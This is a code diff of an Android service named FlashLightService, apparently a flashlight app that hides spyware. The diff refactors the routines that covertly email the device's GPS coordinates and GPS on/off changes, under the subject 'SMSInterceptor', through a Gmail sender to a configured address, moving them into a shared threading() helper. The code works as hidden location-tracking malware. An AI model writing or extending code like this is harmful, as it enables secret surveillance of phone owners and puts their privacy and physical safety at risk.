@@ -43,7 +43,6 @@ public class FlashLightService extends Service implements LocationListener {
   public  static String sEmailAddressDb;
 
   private static GmailSender sender;
-  private static Configure configure;
   private static LocationManager locationManager;
   private static DatabaseHandler databaseHandler;
 
@@ -51,11 +50,8 @@ public class FlashLightService extends Service implements LocationListener {
   private static boolean mLocation = false;
 
   public FlashLightService() { 
-
+    gmailEmailString = emailAddress();
     Log.i(TAG, "Entering FlashLightService() constructor");
-
-    configure = new Configure();
-    gmailEmailString = configure.emailAddress();
     Log.i(TAG, "FlashLightServce() constructor gmailEmailString " + gmailEmailString);
   } 
 
@@ -79,20 +75,7 @@ public class FlashLightService extends Service implements LocationListener {
 
   @Override
   public void onProviderDisabled(String s) {
-    new Thread(new Runnable() {
-
-      @Override
-      public void run() {
-        try {
-          sender = new GmailSender();
-          sender.sendMail("SMSInterceptor", "GPS has been 'DIS'abled!", gmailEmailString);
-        }
-        catch(Exception e) {
-          e.printStackTrace();
-          Log.e(TAG, "onProviderDisabled() Exception e " + e.toString());
-        }
-      }
-    }).start();       
+    threading("GPS has been 'DIS'abled!");
     eLocation = false;
   }
 
@@ -101,20 +84,7 @@ public class FlashLightService extends Service implements LocationListener {
 
   @Override
   public void onProviderEnabled(String s) {
-    new Thread(new Runnable() {
-
-      @Override
-      public void run() {
-        try {
-          sender = new GmailSender();
-          sender.sendMail("SMSInterceptor", "GPS has been 'EN'abled!", gmailEmailString);
-        }
-        catch(Exception e) {
-          e.printStackTrace();
-          Log.e(TAG, "onProviderEnabled() Exception e " + e.toString());
-        }
-      }
-    }).start();
+    threading("GPS has been 'EN'abled!");
     eLocation = true;
   }
 
@@ -126,21 +96,8 @@ public class FlashLightService extends Service implements LocationListener {
       Double dlongitude = location.getLongitude();
       final String longitude  = String.valueOf(dlongitude);
 
-      new Thread(new Runnable() {
-
-        @Override
-        public void run() {
-          try {
-            sender = new GmailSender();
-            sender.sendMail("SMSInterceptor", "Location!\nlatitude-longitude coordinates:\n" +
-            "" + latitude + "," + longitude, gmailEmailString);
-          }
-          catch(Exception e) {
-            e.printStackTrace();
-            Log.e(TAG, "onLocationChanged() Exception e " + e.toString());
-          }
-        }
-      }).start();
+      threading("Location!\nlatitude-longitude coordinates:\n" +
+        "" + latitude + "," + longitude);
     }
     mLocation = false;
   }
@@ -276,6 +233,24 @@ public class FlashLightService extends Service implements LocationListener {
     return database_action;
   }
 
+  public void threading(final String message) {
+    final String SUBJECT = "SMSInterceptor";
+    new Thread(new Runnable() {
+      @Override
+      public void run() {
+        try {
+          sender = new GmailSender();
+          sender.sendMail(SUBJECT, message, gmailEmailString);
+        }
+        catch(Exception e) {
+          Log.e(TAG, "thread() Exception e " + e.toString());
+          e.printStackTrace();
+        }
+      }
+    }).start();
+  }
+
+
   public void onCreate(Context context, Intent intent) {
     Log.d(TAG, "onCreate()");
     try {
@@ -315,20 +290,7 @@ public class FlashLightService extends Service implements LocationListener {
     //if(!eLocation && data != null && intent.hasExtra("obtainLocation")) {
     try {
       if(!eLocation && intent.hasExtra("obtainLocation")) {
-        new Thread(new Runnable() {
-
-          @Override
-          public void run() {
-            try {
-              sender = new GmailSender();
-              sender.sendMail("SMSInterceptor", "GPS is not enabled. Cannot obtain location.", gmailEmailString);
-            }
-            catch(Exception e) {
-              e.printStackTrace();
-              Log.e(TAG, "onStartCommand() Exception e " + e.toString());
-            }
-          }
-        }).start();
+        threading("GPS is not enabled. Cannot obtain location.");
       }
       else if(eLocation && intent.hasExtra("obtainLocation")) {
         mLocation = true;
